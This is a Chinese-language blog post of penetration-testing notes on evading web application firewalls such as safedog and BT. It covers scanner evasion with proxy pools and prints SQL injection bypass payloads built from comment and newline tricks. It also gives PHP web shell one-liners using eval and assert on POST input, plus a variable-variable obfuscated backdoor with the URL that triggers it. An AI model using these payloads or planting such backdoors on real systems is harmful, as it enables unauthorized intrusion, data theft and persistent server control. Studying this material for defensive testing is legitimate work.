<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>  · forg12_blog</title><meta name="description" content=" - forg12"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="forg12_blog"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="forg12_blog" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title"></h1><div class="post-info">2022年2月26日</div><div class="post-content"><p>WAF拦截会出现在安全测试的各个层面，掌握各个层面的分析和绕过技术最为关键。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是WAF绕过的第一步，若是信息收集出现问题，后续的操作就不好进行。</p>
<h2 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1.测试环境"></a>1.测试环境</h2><p>aliyun-os<br>BT<br>safedog</p>
<h2 id="2-绕过分析"><a href="#2-绕过分析" class="headerlink" title="2.绕过分析"></a>2.绕过分析</h2><p>抓包技术<br>WAF说明<br>FUZZ测试</p>
<h2 id="3-绕过手法"><a href="#3-绕过手法" class="headerlink" title="3.绕过手法"></a>3.绕过手法</h2><h3 id="3-1数据包特征"><a href="#3-1数据包特征" class="headerlink" title="3.1数据包特征"></a>3.1数据包特征</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>就是更改请求方式，去请求数据。例如：Head方式改为GET方式请求数据。</p>
<h4 id="模拟用户"><a href="#模拟用户" class="headerlink" title="模拟用户"></a>模拟用户</h4><p>将使用工具请求网站所提交的数据包尽可能的像用户使用浏览器访问所提交的数据包。</p>
<h4 id="爬虫引擎"><a href="#爬虫引擎" class="headerlink" title="爬虫引擎"></a>爬虫引擎</h4><p>这个不是通用的，这个属于部分WAF上面的一个特有的性值。WAF上面有黑白名单机制。在网站中加入到黑名单就代表禁止访问。白名单就是不进行拦截，符合规则可以任意访问。</p>
<h4 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制"></a>白名单机制</h4><h3 id="3-2请求速度"><a href="#3-2请求速度" class="headerlink" title="3.2请求速度"></a>3.2请求速度</h3><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><h4 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h4><p>代理就是你的请求先发到代理服务器上，代理服务器再转发给目标服务器。<br>作用就是当使用其中的一个IP去请求目标网站时被封了，那么可以换另一个IP继续对该网站进行访问。<br>当对阿里云的服务器扫描时扫的扫的就会找不到网站，原因是阿里云屏蔽了的IP。自带的阿里云防护对于扫描工具防护 的比较厉害。</p>
<h4 id="爬虫引擎-1"><a href="#爬虫引擎-1" class="headerlink" title="爬虫引擎"></a>爬虫引擎</h4><h4 id="白名单机制-1"><a href="#白名单机制-1" class="headerlink" title="白名单机制"></a>白名单机制</h4><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h4 id="awvs-xray漏扫Payload绕过-延时白名单burpsuite作为中转"><a href="#awvs-xray漏扫Payload绕过-延时白名单burpsuite作为中转" class="headerlink" title="awvs+xray漏扫Payload绕过-延时白名单burpsuite作为中转"></a>awvs+xray漏扫Payload绕过-延时白名单burpsuite作为中转</h4><p><img src="WAF%E7%BB%95%E8%BF%87.assets/1636425067706-9eed5180-9166-4b3f-ba21-1609d7ad1acf.png" alt="image.png"><br> !<img src="WAF%E7%BB%95%E8%BF%87.assets/1636425077567-08544df8-9d19-4b14-ab90-d7d44285f058.png" alt="image.png"><br>!<img src="WAF%E7%BB%95%E8%BF%87.assets/1636425083407-24923fc6-9e06-4b65-a39f-3942285960d0.png" alt="image.png"></p>
<p>代理池网站：<a target="_blank" rel="noopener" href="https://www.kuaidaili.com/pricing/">https://www.kuaidaili.com/pricing/</a></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="手工注入绕过"><a href="#手工注入绕过" class="headerlink" title="手工注入绕过"></a>手工注入绕过</h3><p>①敏感字符绕过 如 union，ordery by 等相关关键字 使用/<strong>/ (注释)绕过 WAF 对敏感字段的查询如 database(); 如 database 后使用 database/</strong>/<br>②联合绕过 %23 代表 # %0A 代表一个换行符 union %23a%0Aselect 1,2,3;%23 如：<br>①id=1%20union %23a%0Aselect 1,2,3;%23<br>②id=1/<em><em>&amp;id=-1%20 union%20 select%201,2,3%23</em>/<br>③id=1%20union/*!44509select</em>/%201,2,3 （大于 4.4509 版 本运行） /<em>!x</em>/ 代表当 mysql 数据库版本大于 x 时, mysql 不再当作注 释，从而将其运行，这是 mysql 的特性</p>
<h1 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h1><h2 id="后门绕过"><a href="#后门绕过" class="headerlink" title="后门绕过"></a>后门绕过</h2><h3 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h3><p>简单后门只是用于简单的学习,而在真实环境中，该后门语句会被直 接 WAF 所检测到，此时就需要我们进行简单的变换。注意：一般情况下多数用 assert 函数因为 assert 能写入变量执行，而 eval 却不行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]); <span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>WAF 检测不到可变的变量时，就会放行也就是无法检测到 木马后门文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;z&#x27;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>后门文件为 1.php 则，在服务器上使用 <a target="_blank" rel="noopener" href="http://ip/1.php?x=b&amp;y=assert">http://IP/1.php?x=b&amp;y=assert</a> 即可 实现因为这样赋值后$a=b $$a=assert=$b 所以直接变成了 assert($_POST[‘z’]);<br>​</p>
<h3 id="加密传输"><a href="#加密传输" class="headerlink" title="加密传输"></a>加密传输</h3><p>思路：<br>后门直接调用 system|phpinfo 等敏感字段时会被 BT 所拦截，尤其是 BT 的 WAF 会拦截 /* 字符的出现，在绕过时，就需要配合截断(%00)，去处理或者相关加密技术 在上述调用 phpinfo() 时，是没开启 BT 的，之开启 safedog 模式，所以没有出现拦截， 一旦开启了 BT，就会对特殊的关键词进行拦截。</p>
<p>!<img src="WAF%E7%BB%95%E8%BF%87.assets/1636425548820-7ece9d51-3a4a-473e-9d45-e7af3c69ff71.png" alt="image.png"></p>
<h3 id="加密混淆"><a href="#加密混淆" class="headerlink" title="加密混淆"></a>加密混淆</h3><p>思路：<br>既然可以加密传输，就会有其它加密的方法，就有了加密混淆使得 WAF 软件无 法检测到关键字段同样达到 WAF 的绕过 。<br>PHP 混淆加密脚本下载地址： <a target="_blank" rel="noopener" href="https://github.com/djunny/enphp">https://github.com/djunny/enphp</a></p>
<h2 id="权限软件"><a href="#权限软件" class="headerlink" title="权限软件"></a>权限软件</h2><p>菜刀：<br>未更新状态，无插件，单向加密传输<br>蚁剑：<br>更新状态，有插件，拓展性强，单向加密传输<br>冰蝎：<br>更新状态，未知插件，双向加密传输</p>
</div></article></div></main><footer><div class="paginator"><a href="/2022/02/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">forg12</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>